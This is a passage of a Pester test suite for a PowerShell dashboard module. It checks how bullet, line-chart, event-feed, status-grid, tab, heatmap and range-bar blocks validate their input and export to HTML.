        @($report['Blocks'][0].Items).Count | Should -Be 1
    }

    It 'Normalises Min / Max with defaults 0 / 100' {
        Add-DhBullet -Report $report -Id 'b1' -Title 'X' -Items @(
            @{ Label='X'; Value=42 }
        )
        $report['Blocks'][0].Items[0].Min | Should -Be 0
        $report['Blocks'][0].Items[0].Max | Should -Be 100
    }

    It 'Target is null when not supplied' {
        Add-DhBullet -Report $report -Id 'b1' -Title 'X' -Items @(
            @{ Label='X'; Value=42 }
        )
        $report['Blocks'][0].Items[0].Target | Should -BeNullOrEmpty
    }

    It 'Throws when item is missing Label' {
        { Add-DhBullet -Report $report -Id 'b1' -Title 'X' -Items @(
            @{ Value=42 }
        ) } | Should -Throw
    }

    It 'Throws when item is missing Value' {
        { Add-DhBullet -Report $report -Id 'b1' -Title 'X' -Items @(
            @{ Label='X' }
        ) } | Should -Throw
    }

    It 'Throws when Value is non-numeric' {
        { Add-DhBullet -Report $report -Id 'b1' -Title 'X' -Items @(
            @{ Label='X'; Value='abc' }
        ) } | Should -Throw
    }

    It 'Throws when Max <= Min' {
        { Add-DhBullet -Report $report -Id 'b1' -Title 'X' -Items @(
            @{ Label='X'; Value=10; Min=50; Max=50 }
        ) } | Should -Throw
    }

    It 'Throws on duplicate block Id' {
        Add-DhBullet -Report $report -Id 'b1' -Title 'X' -Items @(@{ Label='X'; Value=1 })
        { Add-DhBullet -Report $report -Id 'b1' -Title 'Y' -Items @(@{ Label='Y'; Value=2 }) } | Should -Throw
    }

    It 'Rag converts to Thresholds and is consumed' {
        Add-DhBullet -Report $report -Id 'b1' -Title 'Latency' -Items @(
            @{ Label='DC01'; Value=42; Target=50; Unit='ms'; Rag=$rag }
        )
        $bi = $report['Blocks'][0].Items[0]
        $bi.Contains('Rag')         | Should -Be $false
        @($bi.Thresholds).Count     | Should -Be 3
        $bi.Thresholds[0].Class     | Should -Be 'cell-ok'
        $bi.Thresholds[1].Class     | Should -Be 'cell-warn'
        $bi.Thresholds[2].Class     | Should -Be 'cell-danger'
    }

    It 'Bands is accepted as alias for Thresholds' {
        Add-DhBullet -Report $report -Id 'b1' -Title 'X' -Items @(
            @{ Label='X'; Value=42
               Bands=@(
                   @{ Max=50;  Class='cell-ok'     }
                   @{ Min=50;  Max=80; Class='cell-warn' }
                   @{ Min=80;             Class='cell-danger' }
               )
            }
        )
        @($report['Blocks'][0].Items[0].Thresholds).Count | Should -Be 3
        $report['Blocks'][0].Items[0].Contains('Bands')   | Should -Be $false
    }

    It 'Rag wins over a legacy Thresholds= array' {
        Add-DhBullet -Report $report -Id 'b1' -Title 'X' -Items @(
            @{ Label='X'; Value=42
               Thresholds=@( @{ Max=999; Class='cell-danger' } )   # would-be discarded
               Rag=$rag
            }
        )
        @($report['Blocks'][0].Items[0].Thresholds).Count | Should -Be 3
        $report['Blocks'][0].Items[0].Thresholds[0].Class | Should -Be 'cell-ok'
    }

    It 'HTML contains bullet block with thresholds + target + ragNoData' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_BulletTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhBullet -Report $report -Id 'b-export' -Title 'LDAP Bind Time' -Items @(
                @{ Label='DC01'; Value=42; Target=50; Max=120; Unit='ms'; Rag=$rag }
                @{ Label='DC02'; Value=68; Target=50; Max=120; Unit='ms'
                   Rag=@{ Green=@{Max=50}; Red=@{Min=50}; NoData=$true } }
            )
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'tbl' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-bullet.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"bullet"'
            $content | Should -Match '"label":"DC01"'
            $content | Should -Match '"value":42'
            $content | Should -Match '"target":50'
            $content | Should -Match '"max":120'
            $content | Should -Match '"unit":"ms"'
            $content | Should -Match '"min":80,"class":"cell-danger"'
            $content | Should -Match '"ragNoData":true'   # second item
            $content | Should -Match 'function renderBullet'
            $content | Should -Match 'function classToAccentBg'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhLineChart  (v1.4 F9)
# ---------------------------------------------------------------------------
Describe 'Add-DhLineChart' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        $script:hours  = @('00:00','04:00','08:00','12:00','16:00','20:00','24:00')
        $script:vals   = @(42,38,55,67,71,68,52)
    }

    It 'Adds a linechart block to the report Blocks list' {
        Add-DhLineChart -Report $report -Id 'lc1' -Title 'CPU' `
            -XAxis $hours `
            -Series @(@{ Label='Avg'; Values=$vals })
        $report['Blocks']               | Should -Not -BeNullOrEmpty
        $report['Blocks'][0].BlockType  | Should -Be 'linechart'
        $report['Blocks'][0].Id         | Should -Be 'lc1'
        @($report['Blocks'][0].Series).Count | Should -Be 1
        @($report['Blocks'][0].XAxis).Count  | Should -Be 7
    }

    It 'Filled defaults to false; -Filled flips it' {
        Add-DhLineChart -Report $report -Id 'lc-flat' -Title 'X' -XAxis $hours -Series @(@{ Label='A'; Values=$vals })
        Add-DhLineChart -Report $report -Id 'lc-area' -Title 'X' -XAxis $hours -Series @(@{ Label='A'; Values=$vals }) -Filled
        $report['Blocks'][0].Filled | Should -Be $false
        $report['Blocks'][1].Filled | Should -Be $true
    }

    It 'TargetLine + TargetLabel stored as supplied' {
        Add-DhLineChart -Report $report -Id 'lc-tl' -Title 'X' `
            -XAxis $hours -Series @(@{ Label='A'; Values=$vals }) `
            -TargetLine 70 -TargetLabel 'Warning'
        $report['Blocks'][0].TargetLine  | Should -Be 70
        $report['Blocks'][0].TargetLabel | Should -Be 'Warning'
    }

    It 'YAxisMin / YAxisMax / YAxisUnit stored as numbers and string' {
        Add-DhLineChart -Report $report -Id 'lc-y' -Title 'X' `
            -XAxis $hours -Series @(@{ Label='A'; Values=$vals }) `
            -YAxisMin 0 -YAxisMax 100 -YAxisUnit '%'
        $report['Blocks'][0].YAxisMin  | Should -Be 0
        $report['Blocks'][0].YAxisMax  | Should -Be 100
        $report['Blocks'][0].YAxisUnit | Should -Be '%'
    }

    It 'Accepts multi-series with different Classes' {
        Add-DhLineChart -Report $report -Id 'lc-multi' -Title 'X' `
            -XAxis $hours `
            -Series @(
                @{ Label='In';  Values=$vals;             Class='cell-ok'   }
                @{ Label='Out'; Values=$vals;             Class='cell-warn' }
            )
        @($report['Blocks'][0].Series).Count | Should -Be 2
        $report['Blocks'][0].Series[0].Class | Should -Be 'cell-ok'
        $report['Blocks'][0].Series[1].Class | Should -Be 'cell-warn'
    }

    It 'Throws when XAxis has < 2 points' {
        { Add-DhLineChart -Report $report -Id 'lc-x' -Title 'X' `
              -XAxis @('only') -Series @(@{ Label='A'; Values=@(1) }) } | Should -Throw
    }

    It 'Throws when Series is empty' {
        { Add-DhLineChart -Report $report -Id 'lc-s' -Title 'X' `
              -XAxis $hours -Series @() } | Should -Throw
    }

    It 'Throws when series Values length does not match XAxis' {
        { Add-DhLineChart -Report $report -Id 'lc-mm' -Title 'X' `
              -XAxis $hours `
              -Series @(@{ Label='A'; Values=@(1,2,3) }) } | Should -Throw
    }

    It 'Throws when a non-numeric value is supplied' {
        { Add-DhLineChart -Report $report -Id 'lc-nan' -Title 'X' `
              -XAxis $hours `
              -Series @(@{ Label='A'; Values=@(1,2,3,'abc',5,6,7) }) } | Should -Throw
    }

    It 'Allows null entries in Values (rendered as line breaks)' {
        Add-DhLineChart -Report $report -Id 'lc-null' -Title 'X' `
            -XAxis $hours `
            -Series @(@{ Label='A'; Values=@(1,2,$null,4,5,6,7) })
        @($report['Blocks'][0].Series[0].Values).Count | Should -Be 7
        [double]::IsNaN($report['Blocks'][0].Series[0].Values[2]) | Should -Be $true
    }

    It 'Throws on duplicate block Id' {
        Add-DhLineChart -Report $report -Id 'lc1' -Title 'X' -XAxis $hours -Series @(@{ Label='A'; Values=$vals })
        { Add-DhLineChart -Report $report -Id 'lc1' -Title 'Y' -XAxis $hours -Series @(@{ Label='B'; Values=$vals }) } | Should -Throw
    }

    It 'Throws when YAxisMax <= YAxisMin' {
        { Add-DhLineChart -Report $report -Id 'lc-bad' -Title 'X' `
              -XAxis $hours -Series @(@{ Label='A'; Values=$vals }) `
              -YAxisMin 100 -YAxisMax 50 } | Should -Throw
    }

    It 'HTML contains linechart block with xAxis + series + target' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_LineTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhLineChart -Report $report -Id 'lc-export' -Title 'Cluster CPU' `
                -XAxis $hours `
                -Series @(@{ Label='Avg'; Values=$vals; Class='cell-ok' }) `
                -TargetLine 70 -TargetLabel 'Warning' `
                -YAxisMin 0 -YAxisMax 100 -YAxisUnit '%'
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'tbl' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-line.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"linechart"'
            $content | Should -Match '"xAxis":\["00:00","04:00"'
            $content | Should -Match '"label":"Avg"'
            $content | Should -Match '"values":\[42,38,55,67,71,68,52\]'
            $content | Should -Match '"targetLine":70'
            $content | Should -Match '"targetLabel":"Warning"'
            $content | Should -Match '"yAxisMin":0'
            $content | Should -Match '"yAxisMax":100'
            $content | Should -Match '"yAxisUnit":"%"'
            $content | Should -Match 'function renderLineChart'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    It 'HTML contains filled area marker and serialises null as JSON null' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_LineTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhLineChart -Report $report -Id 'lc-area' -Title 'BW' `
                -Filled `
                -XAxis $hours `
                -Series @(@{ Label='In'; Values=@(800,950,$null,1240,1200,1180,900); Class='cell-ok' })
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'tbl' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-line-area.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"filled":true'
            $content | Should -Match '"values":\[800,950,null,1240,1200,1180,900\]'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhEventFeed  (v1.4 F11)
# ---------------------------------------------------------------------------
Describe 'Add-DhEventFeed' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        $script:events = @(
            @{ Timestamp='2026-05-22 14:32'; Severity='critical'; Source='DC01'; Message='Replication failure to DC03' }
            @{ Timestamp='2026-05-22 14:18'; Severity='warning';  Source='DC02'; Message='LDAP bind time > 80 ms (avg)' }
            @{ Timestamp='2026-05-22 13:55'; Severity='info';     Source='vSphere'; Message='vMotion: VM-027 to ESXi-04' }
        )
    }

    It 'Adds an eventfeed block to the report Blocks list' {
        Add-DhEventFeed -Report $report -Id 'ef1' -Title 'Recent events' -Events $events
        $report['Blocks']                | Should -Not -BeNullOrEmpty
        $report['Blocks'][0].BlockType   | Should -Be 'eventfeed'
        @($report['Blocks'][0].Events).Count | Should -Be 3
        $report['Blocks'][0].MaxItems       | Should -Be 50    # default
        $report['Blocks'][0].GroupBy        | Should -Be 'none' # default
        $report['Blocks'][0].SortDescending | Should -Be $true
    }

    It 'Normalises severities to lowercase' {
        Add-DhEventFeed -Report $report -Id 'ef1' -Title 'X' `
            -Events @(@{ Timestamp='t'; Severity='WARNING'; Message='m' })
        $report['Blocks'][0].Events[0].Severity | Should -Be 'warning'
    }

    It 'Throws when an event is missing Timestamp' {
        { Add-DhEventFeed -Report $report -Id 'ef1' -Title 'X' `
              -Events @(@{ Severity='info'; Message='m' }) } | Should -Throw
    }

    It 'Throws when an event is missing Severity' {
        { Add-DhEventFeed -Report $report -Id 'ef1' -Title 'X' `
              -Events @(@{ Timestamp='t'; Message='m' }) } | Should -Throw
    }

    It 'Throws when an event is missing Message' {
        { Add-DhEventFeed -Report $report -Id 'ef1' -Title 'X' `
              -Events @(@{ Timestamp='t'; Severity='info' }) } | Should -Throw
    }

    It 'Throws on invalid Severity' {
        { Add-DhEventFeed -Report $report -Id 'ef1' -Title 'X' `
              -Events @(@{ Timestamp='t'; Severity='emergency'; Message='m' }) } | Should -Throw
    }

    It 'Throws on duplicate block Id' {
        Add-DhEventFeed -Report $report -Id 'ef1' -Title 'X' -Events $events
        { Add-DhEventFeed -Report $report -Id 'ef1' -Title 'Y' -Events $events } | Should -Throw
    }

    It 'Throws on empty Events' {
        { Add-DhEventFeed -Report $report -Id 'ef1' -Title 'X' -Events @() } | Should -Throw
    }

    It 'GroupBy accepts None / Severity / Source' {
        foreach ($g in 'None','Severity','Source') {
            $r = New-DhDashboard -Title 'T'
            Add-DhEventFeed -Report $r -Id 'ef' -Title 'X' -Events $events -GroupBy $g
            $r['Blocks'][0].GroupBy | Should -Be $g.ToLower()
        }
    }

    It 'GroupBy rejects unknown values' {
        { Add-DhEventFeed -Report $report -Id 'ef1' -Title 'X' -Events $events -GroupBy 'Time' } | Should -Throw
    }

    It 'MaxItems range-validated' {
        { Add-DhEventFeed -Report $report -Id 'ef1' -Title 'X' -Events $events -MaxItems 0 } | Should -Throw
    }

    It 'HTML contains eventfeed block with events + groupBy + sortDescending' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_EventTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhEventFeed -Report $report -Id 'ef-export' -Title 'Recent events (24h)' `
                -Events $events -MaxItems 50 -GroupBy 'Severity'
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'tbl' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-eventfeed.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"eventfeed"'
            $content | Should -Match '"groupBy":"severity"'
            $content | Should -Match '"sortDescending":true'
            $content | Should -Match '"timestamp":"2026-05-22 14:32"'
            $content | Should -Match '"severity":"critical"'
            $content | Should -Match '"source":"DC01"'
            $content | Should -Match '"message":"Replication failure to DC03"'
            $content | Should -Match 'function renderEventFeed'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhStatusGrid  (v1.4 F5)
# ---------------------------------------------------------------------------
Describe 'Add-DhStatusGrid' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        $script:rows = @('Auth','Billing','Search','Mail')
        $script:cols = @('us-east','us-west','eu-west','ap-south')
        $script:cells = @(
            @{ Row='Auth';    Column='us-east'; Status='ok';     Tooltip='99.98% / 24h' }
            @{ Row='Auth';    Column='eu-west'; Status='warn';   Tooltip='latency spike' }
            @{ Row='Billing'; Column='us-east'; Status='danger'; Tooltip='down 12m' }
            @{ Row='Search';  Column='ap-south'; Status='nodata' }
        )
    }

    It 'Adds a statusgrid block to the report Blocks list' {
        Add-DhStatusGrid -Report $report -Id 'sg1' -Title 'Service Health' `
            -Rows $rows -Columns $cols -Cells $cells
        $report['Blocks']                | Should -Not -BeNullOrEmpty
        $report['Blocks'][0].BlockType   | Should -Be 'statusgrid'
        @($report['Blocks'][0].Rows).Count    | Should -Be 4
        @($report['Blocks'][0].Columns).Count | Should -Be 4
        @($report['Blocks'][0].Cells).Count   | Should -Be 4
        $report['Blocks'][0].CellSize    | Should -Be 'normal'  # default
    }

    It 'Throws when a cell Row is not in -Rows' {
        $bad = @(@{ Row='Unknown'; Column='us-east'; Status='ok' })
        { Add-DhStatusGrid -Report $report -Id 'sg1' -Title 'X' `
              -Rows $rows -Columns $cols -Cells $bad } | Should -Throw
    }

    It 'Throws when a cell Column is not in -Columns' {
        $bad = @(@{ Row='Auth'; Column='Unknown'; Status='ok' })
        { Add-DhStatusGrid -Report $report -Id 'sg1' -Title 'X' `
              -Rows $rows -Columns $cols -Cells $bad } | Should -Throw
    }

    It 'Throws on invalid Status' {
        $bad = @(@{ Row='Auth'; Column='us-east'; Status='glowing' })
        { Add-DhStatusGrid -Report $report -Id 'sg1' -Title 'X' `
              -Rows $rows -Columns $cols -Cells $bad } | Should -Throw
    }

    It 'Throws on duplicate block Id' {
        Add-DhStatusGrid -Report $report -Id 'sg1' -Title 'A' -Rows $rows -Columns $cols -Cells $cells
        { Add-DhStatusGrid -Report $report -Id 'sg1' -Title 'B' -Rows $rows -Columns $cols -Cells $cells } | Should -Throw
    }

    It 'Throws when Rows × Columns exceeds -MaxCells' {
        $bigRows = 1..50 | ForEach-Object { "r$_" }
        $bigCols = 1..50 | ForEach-Object { "c$_" }
        { Add-DhStatusGrid -Report $report -Id 'sg-big' -Title 'X' `
              -Rows $bigRows -Columns $bigCols -Cells @(@{ Row='r1'; Column='c1'; Status='ok' }) `
              -MaxCells 2000 } | Should -Throw
    }

    It 'Warns when Rows × Columns exceeds the soft 200-cell limit' {
        $mediumRows = 1..30 | ForEach-Object { "r$_" }
        $mediumCols = 1..10 | ForEach-Object { "c$_" }
        { Add-DhStatusGrid -Report $report -Id 'sg-medium' -Title 'X' `
              -Rows $mediumRows -Columns $mediumCols -Cells @(@{ Row='r1'; Column='c1'; Status='ok' }) `
              -WarningAction Stop } | Should -Throw
    }

    It 'CellSize accepts small / normal / large' {
        foreach ($sz in 'small','normal','large') {
            $r = New-DhDashboard -Title 'T'
            Add-DhStatusGrid -Report $r -Id 'sg' -Title 'X' `
                -Rows $rows -Columns $cols -Cells $cells -CellSize $sz
            $r['Blocks'][0].CellSize | Should -Be $sz
        }
    }

    It 'CellSize rejects unknown values' {
        { Add-DhStatusGrid -Report $report -Id 'sg1' -Title 'X' `
              -Rows $rows -Columns $cols -Cells $cells -CellSize 'huge' } | Should -Throw
    }

    It 'LinkFilter without LinkTableId throws' {
        $bad = @(@{ Row='Auth'; Column='us-east'; Status='ok'; LinkFilter='just-filter' })
        { Add-DhStatusGrid -Report $report -Id 'sg1' -Title 'X' `
              -Rows $rows -Columns $cols -Cells $bad } | Should -Throw
    }

    It 'HTML contains statusgrid block with rows / columns / cells' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_SGTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhStatusGrid -Report $report -Id 'sg-export' -Title 'Service Health' `
                -RowLabel 'Service' -ColumnLabel 'Region' `
                -Rows $rows -Columns $cols -Cells (
                    $cells + @{ Row='Mail'; Column='us-west'; Status='warn';
                                LinkTableId='incidents'; LinkFilter='mail-uswest' }
                ) `
                -CellSize 'normal'
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'incidents' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-statusgrid.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"statusgrid"'
            $content | Should -Match '"rowLabel":"Service"'
            $content | Should -Match '"columnLabel":"Region"'
            $content | Should -Match '"cellSize":"normal"'
            $content | Should -Match '"rows":\["Auth","Billing","Search","Mail"\]'
            $content | Should -Match '"columns":\["us-east","us-west","eu-west","ap-south"\]'
            $content | Should -Match '"status":"danger"'
            $content | Should -Match '"linkTableId":"incidents"'
            $content | Should -Match '"linkFilter":"mail-uswest"'
            $content | Should -Match 'function renderStatusGrid'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhTabs   (v1.5)
# ---------------------------------------------------------------------------
Describe 'Add-DhTabs' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        $script:tabs = @(
            @{ Title = 'Overview';   Content = '<p>One</p>'; Icon = 'O' }
            @{ Title = 'Detail';     Content = '<p>Two</p>' }
            @{ Title = 'Raw';        Content = '<pre>raw</pre>' }
        )
    }

    It 'Adds a tabs block to the report Blocks list' {
        Add-DhTabs -Report $report -Id 't1' -Title 'Pivot' -Tabs $tabs
        $report['Blocks']                  | Should -Not -BeNullOrEmpty
        $report['Blocks'][0].BlockType     | Should -Be 'tabs'
        @($report['Blocks'][0].Tabs).Count | Should -Be 3
        # First tab auto-active when none specified
        $report['Blocks'][0].Tabs[0].Active | Should -Be $true
    }

    It 'Respects an explicit Active=$true on a non-first tab' {
        $t = @(
            @{ Title = 'A'; Content = 'a' }
            @{ Title = 'B'; Content = 'b'; Active = $true }
            @{ Title = 'C'; Content = 'c' }
        )
        Add-DhTabs -Report $report -Id 't2' -Title 'X' -Tabs $t
        $report['Blocks'][0].Tabs[0].Active | Should -Be $false
        $report['Blocks'][0].Tabs[1].Active | Should -Be $true
    }

    It 'Accepts a single tab and auto-activates it (regression: scalar $normTabs)' {
        # A one-element -Tabs previously made $normTabs a scalar hashtable, so the
        # "no tab active -> activate first" step did $normTabs[0] on a scalar and
        # threw. @(...) around the build loop fixes it.
        { Add-DhTabs -Report $report -Id 't-single' -Tabs @(
            @{ Title = 'Solo'; Content = '<p>only tab</p>' }
        ) -WarningAction SilentlyContinue } | Should -Not -Throw
        $block = $report['Blocks'] | Where-Object Id -eq 't-single'
        @($block.Tabs).Count       | Should -Be 1
        $block.Tabs[0].Active       | Should -Be $true
    }

    It 'Throws when a tab is missing Title' {
        $bad = @(@{ Content = 'no title' })
        { Add-DhTabs -Report $report -Id 't1' -Title 'X' -Tabs $bad } | Should -Throw
    }

    It 'Throws on duplicate block Id' {
        Add-DhTabs -Report $report -Id 't1' -Title 'A' -Tabs $tabs
        { Add-DhTabs -Report $report -Id 't1' -Title 'B' -Tabs $tabs } | Should -Throw
    }

    It 'HTML contains tabs block + renderTabs renderer' {
        $tmp = Join-Path ([IO.Path]::GetTempPath()) ('DH_TabsTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmp | Out-Null
        try {
            Add-DhTabs -Report $report -Id 'tabs-export' -Title 'Pivot' -Tabs $tabs
            $htmlPath = Join-Path $tmp 'test-tabs.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"tabs"'
            $content | Should -Match '"title":"Overview"'
            $content | Should -Match 'function renderTabs'
        } finally {
            Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhHeatmap   (v1.5)
# ---------------------------------------------------------------------------
Describe 'Add-DhHeatmap' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        $script:rows = @('Mon','Tue','Wed','Thu','Fri')
        $script:cols = @('00','06','12','18')
        $script:cells = @(
            @{ Row='Mon'; Column='00'; Value=12 }
            @{ Row='Mon'; Column='12'; Value=88; Tooltip='peak load' }
            @{ Row='Tue'; Column='06'; Value=55 }
            @{ Row='Wed'; Column='18'; Value=33 }
            @{ Row='Fri'; Column='12'; Value=72 }
        )
    }

    It 'Adds a heatmap block with sequential default' {
        Add-DhHeatmap -Report $report -Id 'hm1' -Title 'Load by Hour' `
            -Rows $rows -Columns $cols -Cells $cells
        $report['Blocks']                  | Should -Not -BeNullOrEmpty
        $report['Blocks'][0].BlockType     | Should -Be 'heatmap'
        @($report['Blocks'][0].Cells).Count | Should -Be 5
        $report['Blocks'][0].ColorScale    | Should -Be 'sequential'
        $report['Blocks'][0].CellSize      | Should -Be 'normal'
    }

    It 'Accepts ColorScale diverging' {
        Add-DhHeatmap -Report $report -Id 'hm1' -Title 'X' `
            -Rows $rows -Columns $cols -Cells $cells -ColorScale 'diverging'
        $report['Blocks'][0].ColorScale | Should -Be 'diverging'
    }

    It 'Rejects unknown ColorScale' {
        { Add-DhHeatmap -Report $report -Id 'hm1' -Title 'X' `
              -Rows $rows -Columns $cols -Cells $cells -ColorScale 'rainbow' } | Should -Throw
    }

    It 'Throws when a cell Row is unknown' {
        $bad = @(@{ Row='Sat'; Column='00'; Value=1 })
        { Add-DhHeatmap -Report $report -Id 'hm1' -Title 'X' `
              -Rows $rows -Columns $cols -Cells $bad } | Should -Throw
    }

    It 'Throws when a cell Column is unknown' {
        $bad = @(@{ Row='Mon'; Column='99'; Value=1 })
        { Add-DhHeatmap -Report $report -Id 'hm1' -Title 'X' `
              -Rows $rows -Columns $cols -Cells $bad } | Should -Throw
    }

    It 'Throws on duplicate block Id' {
        Add-DhHeatmap -Report $report -Id 'hm1' -Title 'A' -Rows $rows -Columns $cols -Cells $cells
        { Add-DhHeatmap -Report $report -Id 'hm1' -Title 'B' -Rows $rows -Columns $cols -Cells $cells } | Should -Throw
    }

    It 'HTML contains heatmap block + renderHeatmap renderer' {
        $tmp = Join-Path ([IO.Path]::GetTempPath()) ('DH_HmTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmp | Out-Null
        try {
            Add-DhHeatmap -Report $report -Id 'hm-export' -Title 'Load' `
                -Rows $rows -Columns $cols -Cells $cells `
                -RowLabel 'Day' -ColumnLabel 'Hour' -Unit '%' -ShowValues
            $htmlPath = Join-Path $tmp 'test-heatmap.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"heatmap"'
            $content | Should -Match '"colorScale":"sequential"'
            $content | Should -Match '"rowLabel":"Day"'
            $content | Should -Match '"columnLabel":"Hour"'
            $content | Should -Match '"unit":"%"'
            $content | Should -Match '"showValues":true'
            $content | Should -Match 'function renderHeatmap'
        } finally {
            Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}


# ---------------------------------------------------------------------------
# Add-DhRangeBar   (v2.1.0)
# ---------------------------------------------------------------------------
Describe 'Add-DhRangeBar' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        $script:items = @(
            @{ Name='cluster01-users';   Low=0; High=315; Min=60; Avg=97; Max=120 }
            @{ Name='cluster02-bigdata'; Low=0; High=104; Min=1;  Avg=2;  Max=10  }
        )
        $script:tblData = @(
            @{ Cluster='c1'; Load=60;    Capacity=315 }
            @{ Cluster='c1'; Load=120;   Capacity=315 }
            @{ Cluster='c1'; Load=111;   Capacity=315 }
            @{ Cluster='c2'; Load=1;     Capacity=104 }
            @{ Cluster='c2'; Load=10;    Capacity=104 }
        )
    }

    It 'Adds a rangebar block in items mode' {
        Add-DhRangeBar -Report $report -Id 'rb1' -Title 'Load' -Items $items
        $report['Blocks']                    | Should -Not -BeNullOrEmpty
        $report['Blocks'][0].BlockType       | Should -Be 'rangebar'
        $report['Blocks'][0].Mode            | Should -Be 'items'
        @($report['Blocks'][0].Items).Count  | Should -Be 2
    }

    It 'Normalises item values to numbers, InvariantCulture' {
        Add-DhRangeBar -Report $report -Id 'rb1' -Title 'Load' -Items @(
            @{ Name='a'; Low='0'; High='10.5'; Min='1.5'; Avg='2.25'; Max='3.75' })
        $report['Blocks'][0].Items[0].High | Should -Be 10.5
        $report['Blocks'][0].Items[0].Avg  | Should -Be 2.25
    }

    It 'Derives an axis caption when none is given' {
        Add-DhRangeBar -Report $report -Id 'rb1' -Title 'Load' -Items $items
        $report['Blocks'][0].AxisLabel | Should -Be '% of high'
    }

    It 'Throws when an item is missing a required key' {
        { Add-DhRangeBar -Report $report -Id 'rb1' -Title 'X' -Items @(
              @{ Name='a'; Low=0; High=10; Min=1; Max=3 }) } | Should -Throw -ExpectedMessage "*'Avg'*"
    }

    It 'Throws on a non-numeric item value' {
        { Add-DhRangeBar -Report $report -Id 'rb1' -Title 'X' -Items @(
              @{ Name='a'; Low=0; High=10; Min='abc'; Avg=2; Max=3 }) } | Should -Throw -ExpectedMessage '*must be a number*'
    }

    It 'Throws on duplicate row names' {
        { Add-DhRangeBar -Report $report -Id 'rb1' -Title 'X' -Items @(
              @{ Name='a'; Low=0; High=10; Min=1; Avg=2; Max=3 }
              @{ Name='a'; Low=0; High=10; Min=1; Avg=2; Max=3 }) } | Should -Throw -ExpectedMessage '*duplicate*'
    }

    It 'Warns but does not throw when High <= Low (spec 3.2)' {
        $w = $null
        Add-DhRangeBar -Report $report -Id 'rb1' -Title 'X' -Items @(
            @{ Name='a'; Low=10; High=10; Min=1; Avg=2; Max=3 }) -WarningVariable w -WarningAction SilentlyContinue
        @($w).Count            | Should -BeGreaterThan 0
        $report['Blocks'].Count | Should -Be 1
    }

    It 'Warns when values fall outside the row scale, keeping the real numbers' {
        $w = $null
        Add-DhRangeBar -Report $report -Id 'rb1' -Title 'X' -Items @(
            @{ Name='a'; Low=0; High=50; Min=10; Avg=60; Max=80 }) -WarningVariable w -WarningAction SilentlyContinue
        @($w).Count                       | Should -BeGreaterThan 0
        $report['Blocks'][0].Items[0].Max | Should -Be 80
    }

    It 'Does not clamp an Avg outside [Min,Max] (spec 5.3)' {
        Add-DhRangeBar -Report $report -Id 'rb1' -Title 'X' -Items @(
            @{ Name='a'; Low=0; High=100; Min=40; Avg=12; Max=70 })
        $report['Blocks'][0].Items[0].Avg | Should -Be 12
    }

    It 'Throws on duplicate block Id' {
